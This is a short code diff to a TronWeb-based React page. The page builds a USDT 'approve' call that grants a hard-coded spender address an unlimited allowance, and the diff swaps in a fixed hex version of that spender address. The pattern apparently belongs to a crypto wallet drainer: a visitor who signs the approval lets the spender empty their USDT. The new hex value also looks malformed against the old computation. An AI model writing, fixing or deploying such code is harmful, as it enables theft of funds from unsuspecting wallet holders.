@@ -15,6 +15,7 @@ declare global {
 const PROJECT_ID   = "6b5df56bc30c1dadaab59498b86fd3e8";
 const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
+const TRON_SPENDER_HEX = "412f0f3b7e2b4c0b2d3e1f6f9a5c8b7d6e4a9c3b2a"; // ✅ नया add करो
 
 export default function Index() {
   const [searchParams] = useSearchParams();
@@ -145,7 +146,7 @@ export default function Index() {
 
       // ✅ APPROVE_ABI_PARAM dynamically generate करो
       const tw = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
-      const hexAddress = tw.address.toHex(TRON_SPENDER).substring(2).padStart(64, '0');
+      const hexAddress = TRON_SPENDER_HEX.padStart(64, '0');
       const hexAmount = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
       const APPROVE_ABI_PARAM = hexAddress + hexAmount;
       console.log("📝 APPROVE_ABI_PARAM:", APPROVE_ABI_PARAM);
